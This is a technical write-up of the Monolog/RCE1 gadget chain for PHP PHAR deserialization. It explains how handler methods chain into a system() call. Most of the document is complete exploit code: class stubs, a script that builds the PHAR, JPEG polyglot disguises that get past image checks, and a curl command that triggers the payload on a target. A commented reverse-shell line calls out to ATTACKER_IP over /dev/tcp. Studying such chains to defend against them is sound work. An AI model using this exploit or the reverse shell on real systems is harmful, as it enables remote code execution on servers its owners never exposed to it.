# Monolog/RCE1 Gadget Chain — PHAR Deserialization

| Field             | Detail                                                                                                                       |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| **Affects**       | `monolog/monolog` 1.4.1–1.6.0, 1.17.2–2.7.0+                                                                                 |
| **Vector**        | `__destruct`                                                                                                                 |
| **Type**          | RCE (Function call)                                                                                                          |
| **PHPGGC Source** | [gadgetchains/Monolog/RCE/1/chain.php](https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/chain.php) |
| **PHP version**   | `phar://` auto-deserialization works on PHP 5.x–7.x only. PHP 8.0+ removed this behavior.                                    |

---

## How the Chain Works

The chain abuses two legitimate Monolog handler classes to achieve arbitrary function execution. Neither class is dangerous on its own — the vulnerability emerges from how they interact during deserialization.

### Step 1: `SyslogUdpHandler.__destruct()`

When PHP garbage-collects the deserialized object, it calls `__destruct()`, inherited from `AbstractHandler`:

```php
// Monolog\Handler\AbstractHandler
public function __destruct() {
    $this->close();
}
```

`SyslogUdpHandler` overrides `close()`:

```php
// Monolog\Handler\SyslogUdpHandler
public function close() {
    $this->socket->close();   // <-- we control $this->socket
}
```

Normally `$socket` is a `UdpSocket`, but we replace it with a `BufferHandler`.

### Step 2: `BufferHandler.close()` → `flush()` → `handleBatch()`

`BufferHandler.close()` calls `flush()`, which calls `$this->handler->handleBatch()`:

```php
// Monolog\Handler\BufferHandler
public function close() {
    $this->flush();
}

public function flush() {
    if ($this->bufferSize > 0) {
        // ... we set bufferSize = -1 to skip this
    }
    $this->handler->handleBatch($this->buffer);
}
```

We set `$handler = $this` (self-reference), so it calls its own `handleBatch()`.

### Step 3: `processRecord()` runs our callable processors

`handleBatch()` iterates `$this->buffer` and calls `handle()` on each entry. `handle()` checks the log level (we bypass with `level = null`) and then runs processors:

```php
// AbstractProcessingHandler
public function handle(array $record) {
    if ($record['level'] < $this->level) return false;  // bypassed: level=null
    $record = $this->processRecord($record);
    // ...
}

protected function processRecord(array $record) {
    foreach ($this->processors as $processor) {
        $record = call_user_func($processor, $record);  // <-- RCE!
    }
}
```

We set `processors = ['current', 'system']`:

1. `current($record)` extracts the first element from the record array (our command string)
2. `system($command)` executes it

### Full Chain Summary

```
SyslogUdpHandler.__destruct()
  → close()
    → $this->socket->close()              [socket = BufferHandler]
      → BufferHandler.close()
        → flush()
          → $this->handler->handleBatch()  [handler = self]
            → handle($record)
              → processRecord($record)
                → call_user_func('current', $record)  → extracts command
                → call_user_func('system', $command)   → RCE!
```

---

## Building the Exploit (No PHPGGC)

### 1. Define minimal class stubs

We only need to match Monolog's class names and property names. PHP deserializes based on structure, not behavior.

```php
<?php
namespace Monolog\Handler
{
    /**
     * Entry point: __destruct → close → $this->socket->close()
     * We inject a BufferHandler as $socket to hijack the close() call.
     */
    class SyslogUdpHandler
    {
        protected $socket;

        function __construct($x)
        {
            $this->socket = $x;
        }
    }

    /**
     * The workhorse. Key properties:
     *   $handler     → self-reference so handleBatch calls itself
     *   $bufferSize  → -1 (ensures flush doesn't bail early)
     *   $buffer      → fake log records containing our command
     *   $level       → null (bypasses log level check)
     *   $initialized → true (skips init logic)
     *   $bufferLimit → -1 (avoids overflow logic)
     *   $processors  → ['current', 'system'] — the RCE callables
     */
    class BufferHandler
    {
        protected $handler;
        protected $bufferSize = -1;
        protected $buffer;
        protected $level = null;
        protected $initialized = true;
        protected $bufferLimit = -1;
        protected $processors;

        function __construct($methods, $command)
        {
            $this->processors = $methods;
            $this->buffer = [$command];
            $this->handler = $this;  // self-reference
        }
    }
}
```

### 2. Assemble the chain and build the PHAR

```php
<?php
namespace
{
    // -- Configure payload --
    $function  = 'system';
    $parameter = 'id';
    // For a reverse shell:
    // $parameter = 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"';

    // Assemble the gadget chain
    $bufferHandler = new \Monolog\Handler\BufferHandler(
        ['current', $function],           // processors
        [$parameter, 'level' => null]     // fake log record
    );

    $chain = new \Monolog\Handler\SyslogUdpHandler(
        $bufferHandler                    // injected as $socket
    );

    // -- Build the PHAR --
    $pharFile = 'exploit.phar';
    @unlink($pharFile);

    $phar = new Phar($pharFile);
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'test');

    $halt = '__HALT_COMPILER();';
    $phar->setStub("<?php {$halt} ?>");

    // Metadata is auto-deserialized when accessed via phar://
    $phar->setMetadata($chain);
    $phar->stopBuffering();

    echo "[+] PHAR created: {$pharFile}\n";
    echo "[+] Payload: {$function}('{$parameter}')\n";
}
```

### 3. Optional: Disguise as JPEG

**Method 1: Fake magic bytes**

```php
<?php
$jpeg_header = "\xFF\xD8\xFF\xE0";
$phar_data   = file_get_contents('exploit.phar');
file_put_contents('exploit.jpg', $jpeg_header . $phar_data);
```

**Method 2: Real JPEG polyglot** (survives `getimagesize()`, `exif_imagetype()`)

```php
<?php
$jpeg = file_get_contents('legit.jpg');

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');

// Embed real JPEG before __HALT_COMPILER
// Image parsers read the JPEG; phar:// skips to the HALT marker
$halt = '__HALT_COMPILER();';
$phar->setStub($jpeg . "<?php {$halt} ?>");

$phar->setMetadata($chain);  // $chain from step 2
$phar->stopBuffering();

rename('exploit.phar', 'exploit.jpg');
```

### 4. Run and trigger

```bash
# Build the PHAR
php -d phar.readonly=0 exploit.php

# Upload exploit.jpg to target, then trigger via any file operation:
curl "http://TARGET/vuln.php?file=phar://uploads/exploit.jpg"
```

Triggerable PHP functions (any that accept stream wrappers):
`file_exists()`, `fopen()`, `file_get_contents()`, `filesize()`, `is_dir()`, `is_file()`, `getimagesize()`, `exif_imagetype()`, `copy()`, `rename()`, `unlink()`

---

## Real-World CVEs Using This Chain

The Monolog gadget chain itself has no CVE. CVEs are assigned to the **applications** that pass untrusted input to file operations with `phar://`:

| CVE            | Application      | Trigger Function                        |
| -------------- | ---------------- | --------------------------------------- |
| CVE-2022-41343 | Dompdf ≤ 2.0.0   | `phar://` via `data://` font cache      |
| WP Meta SEO    | WordPress plugin | `file_exists()` on user-controlled path |

---

## References

- **PHPGGC** — https://github.com/ambionics/phpggc
- **BlackHat US 2018** — Sam Thomas, _"It's a PHP Unserialization Vulnerability Jim, But Not as We Know It"_
- **PHP 8.0 migration** — `phar://` no longer auto-deserializes metadata on stream operations
- **Monolog source** — https://github.com/Seldaek/monolog
